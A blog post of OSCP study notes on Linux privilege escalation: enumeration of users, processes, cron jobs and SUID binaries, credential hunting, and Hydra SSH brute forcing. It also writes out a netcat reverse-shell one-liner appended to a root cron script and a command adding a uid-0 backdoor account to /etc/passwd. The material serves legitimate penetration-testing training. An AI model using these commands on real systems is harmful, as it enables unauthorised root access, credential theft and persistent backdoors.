---
title: Linux Privilege Escalation
date: 2024-03-23 10:08:00 -0600
categories: [OSCP]
tags: [oscp, pen200, offsec, certs]     # TAG names should always be lowercase
---
*The Linux Privilege Escalation tools and tactics reviewed here are presented specifically in preparation for the OSCP exam per course suggestions and are by no means replacements for the OSCP training course, nor comprehensive guides for this step in the Kill Chain.*

# Linux Privilege Escalation

Let's enumerate Linux machines and conduct privilege escalation from insecure file permissions and misconfigured system components.

## Enumerating Linux

### File and User Privileges on Linux

In UNIX, most resources like files, dirs, devices, and network comms are represented in the filesystem. Every file abides by user and group perms based on read, write, and execute, for the owner, owner group, and others group.

Directories are handled different than files. Read access lets you consult the list of contents (files and dirs), Write access lets you create and delete files, and Execute access allows crossing through the directory to access contents (like using cd). Being able to cross through a directory without being able to read it gives the user permission to access known entries, but only by knowing their exact name.

Example:

```console
kali@kali:~$ ls -l /etc/shadow
-rw-r----- 1 root shadow 1751 May  2 09:31 /etc/shadow
```

The first hyphen is for the file type. The next three are the owner perms (rw). The next are the shadow group owner perms.  Lastly, the others group.

### Manual Enumeration

Some commands in this section may require minor modifications one different target OSs, and they will not always be reproducible on the dedicated clients.

```console
kali:~$ ssh joe@111.111.111.111

// get user context

$ id
uid=1000(joe) gid=1000(joe) groups=1000(joe),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),112(bluetooth),116(lpadmin),117(scanner)

// enum all users via passwd file

$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
...
Debian-gdm:x:117:124:Gnome Display Manager:/var/lib/gdm3:/bin/false
joe:x:1000:1000:joe,,,:/home/joe:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
eve:x:1001:1001:,,,:/home/eve:/bin/bash

// we can see that a web server (www-data) and an SSH server (sshd) are running on this target.
```

From the Passwd file:
- Login Name - joe
- Encrypted Password -"x - this field would typically contain the hashed version of the user's passowrd, but the x indicated the entire password hash is in the /etc/shadow file
- UID - 1000 - root user always has UID of 0, and then Linux counts regualar users from 1000 (aka the real user ID)
- GID - 1000 - the user's specific Group ID
- Comment - joe,,, - field usually contrains a description of the user, often just the username
- Home Folder: /home/joe - the user's home dir prompted upon login
- Login Shell: /bin/bash - the default interactive shell, if one exists

Eve is another user who we can assume to be a standard user due to the account's configured home dir of /home/eve. System services are configed with the /usr/sbin/nologin as login shell, where the nologin statement is used to block any remote or local login for svc accounts.

Next - hostname. Enterprises often have a naming convention so they can indicate location, description, OS, and service level.

```console
$ hostname
debian-privesc
```

Sometimes we need to rely on kernel exploits that attack in the core of a target's OS. These are very specific for each OS and version. Mismatches can cause crashes or instability.

The /etc/issue and /etc/*-release files have info on the OS release and version.

```console
joe@debian-privesc:~$ cat /etc/issue
Debian GNU/Linux 10 \n \l

joe@debian-privesc:~$ cat /etc/os-release
PRETTY_NAME="Debian GNU/Linux 10 (buster)"
NAME="Debian GNU/Linux"
VERSION_ID="10"
VERSION="10 (buster)"
VERSION_CODENAME=buster
ID=debian
HOME_URL="https://www.debian.org/"
SUPPORT_URL="https://www.debian.org/support"
BUG_REPORT_URL="https://bugs.debian.org/"

joe@debian-privesc:~$ uname -a
Linux debian-privesc 4.19.0-21-amd64 #1 SMP Debian 4.19.249-2 (2022-06-30)
x86_64 GNU/Linux
```

To leverage the running processes and services in privilege escalation, we need the process to run in the context of a privileged account and it must either have insecure perms or allow us to interact with it in unintended ways.

```console
$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.4 169592 10176 ?        Ss   Aug16   0:02 /sbin/init
...
colord     752  0.0  0.6 246984 12424 ?        Ssl  Aug16   0:00 /usr/lib/colord/colord
Debian-+   753  0.0  0.2 157188  5248 ?        Sl   Aug16   0:00 /usr/lib/dconf/dconf-service
root       477  0.0  0.5 179064 11060 ?        Ssl  Aug16   0:00 /usr/sbin/cups-browsed
root       479  0.0  0.4 236048  9152 ?        Ssl  Aug16   0:00 /usr/lib/policykit-1/polkitd --no-debug
root       486  0.0  1.0 123768 22104 ?        Ssl  Aug16   0:00 /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
root       510  0.0  0.3  13812  7288 ?        Ss   Aug16   0:00 /usr/sbin/sshd -D
root       512  0.0  0.3 241852  8080 ?        Ssl  Aug16   0:00 /usr/sbin/gdm3
root       519  0.0  0.4 166764  8308 ?        Sl   Aug16   0:00 gdm-session-worker [pam/gdm-launch-environment]
root       530  0.0  0.2  11164  4448 ?        Ss   Aug16   0:03 /usr/sbin/apache2 -k start
root      1545  0.0  0.0      0     0 ?        I    Aug16   0:00 [kworker/1:1-events]
root      1653  0.0  0.3  14648  7712 ?        Ss   01:03   0:00 sshd: joe [priv]
root      1656  0.0  0.0      0     0 ?        I    01:03   0:00 [kworker/1:2-events_power_efficient]
joe       1657  0.0  0.4  21160  8960 ?        Ss   01:03   0:00 /lib/systemd/systemd --user
joe       1658  0.0  0.1 170892  2532 ?        S    01:03   0:00 (sd-pam)
joe       1672  0.0  0.2  14932  5064 ?        S    01:03   0:00 sshd: joe@pts/0
joe       1673  0.0  0.2   8224  5020 pts/0    Ss   01:03   0:00 -bash
root      1727  0.0  0.0      0     0 ?        I    03:00   0:00 [kworker/0:0-ata_sff]
root      1728  0.0  0.0      0     0 ?        I    03:06   0:00 [kworker/0:2-ata_sff]
joe       1730  0.0  0.1  10600  3028 pts/0    R+   03:10   0:00 ps axu
```

Several of these run as root. You should research possible vulnerabilities. 

Next, review network information to see if the target could be a pivot to another machine or if there are virtualization or antivirus softwares. We'll also look at port bindings to see if a running svc is only available on a loopback address instead of a routeable one, because privileges programs listening on the loopback interface could increase our attack surface and probability of privilege escalation.

```console
// network interfaces
$ ifconfig -a
// OR, depending on the distro
$ ip a

// routing tables
$ route
// OR, depending on the distro
$ routel

// active net conns and listening ports
$ netstat
// OR, depending on the distro
$ ss -anp
```

Next, firewall rules. We are interested in the firewall's state, profile, and rules when we exploit, but also during privilege escalation. Ex: If a network service is not remotely accessible because it is blocked by the firewall, it is generally accessible locally via the loopback interface. So, if you can interact with the services locally, you could exploit them for privilege escalation. We'll also look at inbound and outbound port filtering to facilitate port forwarding and tunneling when we need to pivot to an internal network.

On Linux, we need root to list the firewall rules with iptables, but, depending on how the firewall is configured, we can glean info as a standard user. The iptables-persistent package on Debian saves FW rules in files under /etc/iptables by default. The files are used to restore netfilter rules at boot. Often, they have weak perms and are readable by local users.

Also search for files created by the iptables-save command, which dumps the FW config to a file specified by the used. The file is usually used as input for the iptables-restore command to restore rules at boot. If a sys admin ever ran this command, we can search the config dir /etc or grep the file system for iptables commands to locate the file. If it has insecure perms, we can use it to infer the FW config rules.

```console
$ cat /etc/iptables/rules.v4

// note down any non-standard rules
```

The Linux job scheduler is cron and tasks are listed under /etc/cron.* dirs, where the * is the frequency at which the task runs (Ex: /etc/cron.daily). Each script is listed in its own subdir.

```console
$ ls -lah /etc/cron*
```

Note that some sysadmins add their own tasks to /etc/crontab. Inspect these tasks for insecure file perms, since most jobs here will run as root.

```console
// list current user's scheduled jobs
$ crontab -l
// if you can, list with SUDO to see jobs run as root
$ sudo crontab -l
```

Now, check installed apps and versions to search for a matching exploit.

```console
// if target is Debian
$ dpkg -l

// if target is Red Hat
$ rpm

// find writable files and see if they match what you found
$ find / -writable -type d 2>/dev/null
```

Moving on to drives. Drives are usually auto-mounted at boot and it can be easy to forget about unmounted drives that we mat find info in. Always look for unmounted drives and the mount permissions.

```console
// list all drives that are mounted at boot
$ cat /etc/fstab

// list all mounted filesystems
$ mount

// list all available disks
$ lsblk
// depending on the system config, you may be able to mount unmounted pertitions and search for interesting documents, creds, or other info
```

Kernel  modules and device drivers exploits are common for privilege escalation. 

```console
// list drivers and kernel modules
$ lsmod

// get info about specific module
$ /sbin/modinfo libata
```

Now, let's look at some shortcuts to privilege escalation. In addition to rwx perms, we have rights pertaining to setuid and setgid, symbolized with "s". This perm lets the current user execute the file with rights of the owner (setuid) or owner's group (setgid).

```console
// find SUID-marked binaries
$ find / -perm -u=s -type f 2>/dev/null
```

An example of a good SUID binary exploitation is if /bin/cp (the copy command) were SUID, we can copy and overwrite sensitive files like /etc/password. 

## Automated Enumeration

unix-privesc-check comes pre-installed on Kali at /usr/bin/unix-privesc-check.

```console
// get file on victim machine
$ scp /bin/unix-privesc-check joe@192.168.242.214:/home/joe/

// for help menu
$ unix-privesc-check

// to run
$ ./unix-privesc-check standard > output.txt
```

Additional Linux privilege escalation tools include [LinEnum](https://github.com/rebootuser/LinEnum) and [LinPeas](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).

## Exposed Confidential Information

### Inspecing User Trails

We have access to user history that can potentially contain cleartext passwords or auth information. Linux systems usually store user-specific config files in the user's home dir. There are called dotfiles, as they are prepended with a period and are not listed when using basic list commands. The .bashrc script is an example - new terminal windows are open from an existing login session or a new shell is started from an existing login session and the .bashrc script holds environment variables that are auto-set when this happens. Sometimes there are creds in env vars.

```console
// list all env variables
$ env

// inspect .bashrc to confirm if the env var you found is a permanent var
$ cat .bashrc

// if you found a password, try to escalate
$ su - root
$ whoami
```

Try building a custom dictionary from the known password to attempt brute force on a second account.

```console
// make dictonary - this is min length 6, max length 6, pattern of three numeric digits after the hardcoded password
$ crunch 6 6 -t Lab%%% > wordlist
```

If your mchine has an SSH server, try a remote brute force with Hydra.

```console
$ hydra -l eve -P wordlist  192.168.50.214 -t 4 ssh -V

$ ssh eve@192.168.50.214

eve$
// list sudo capabilities
eve$ sudo -l
User eve may run the following commands on debian-privesc:
    (ALL : ALL) ALL

// escalate to root
$ sudo -i
```

### Inspecting Service Footprints

System daemons are Linux services spawned at boot that perform specific operations without user interaction. Servers like SSH, web servers, and databases especially host many daemons. Sysadmins often rely on custom daemons to do ad-hoc tasks. We should inspect running process anomalies. 

On Linux, we can list info about higher-privilegeprocesses, unlike Windows.

```console
// in this command, ps runs every second with the watch utility and we grep the results for "pass".
$ watch -n 1 "ps -aux | grep pass"

joe      16867  0.0  0.1   6352  2996 pts/0    S+   05:41   0:00 watch -n 1 ps -aux | grep pass
root     16880  0.0  0.0   2384   756 ?        S    05:41   0:00 sh -c sshpass -p 'Lab123' ssh  -t eve@127.0.0.1 'sleep 5;exit'
root     16881  0.0  0.0   2356  1640 ?        S    05:41   0:00 sshpass -p zzzzzz ssh -t eve@127.0.0.1 sleep 5;exit
```

This daemon is connecting to the local system via eve with cleartext creds. The daemon is also root and we can still inspect its activity.

We should also verify if we have rights to capture network traffic. NOTE: tcpdump needs sudo perms.

```console
// captures traffic on the loopback interface, dumps in ASCII, looks for "pass"
$ sudo tcpdump -i lo -A | grep "pass"

tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
...{...zuser:root,pass:lab -
...5...5user:root,pass:lab -
```

## Insecure File Permissions

### Abusing Cron Jobs

To leverage Insecure File Permissions, we need a writable file that runs with elevated privileges. The cron time-based job scheduler on Linux is a prime target. 

```console
$ ls -lah /etc/cron*
$ crontab -l
$ sudo crontab -l
$ grep "CRON" /var/log/syslog
Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
```

Here, user_backups is run as root every minute. Check contents and perms.

```console
$ cat /home/joe/.scripts/user_backups.sh
$ ls -lah /home/joe/.scripts/user_backups.sh
```

We can edit this file. Add a reverse shell one-liner.

```console
joe@debian-privesc:~$ cd .scripts

joe@debian-privesc:~/.scripts$ echo >> user_backups.sh

joe@debian-privesc:~/.scripts$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh

joe@debian-privesc:~/.scripts$ cat user_backups.sh
#!/bin/bash

cp -rf /home/joe/ /var/backups/joe/

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f
```

Set up a listener on Kali and wait.

```console
$ nc -lnvp 1234
```

### Abusing Password Authentication

Unless a cental cred system like AD or LSAP is used, Linux passwords are usually in /etc/shadow, unreadable by normal users. Password hashes and other information, though, are world-readible in /etc/passwd. If a password hash is present in the second column of an /etc/passwd user record, it is considered valid for authentication and it takes precedence over the respective entry in /etc/shadow. So - if  we can write to /etc/passwd, we can set any password for any account.

Assuming we already have su, let's add another superuser root2 and a password hash to /etc/passwd. 

```console
$ openssl passwd w00t

$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

$ su root2

# id
uid=0(root) gid=0(root) groups=0(root)
```
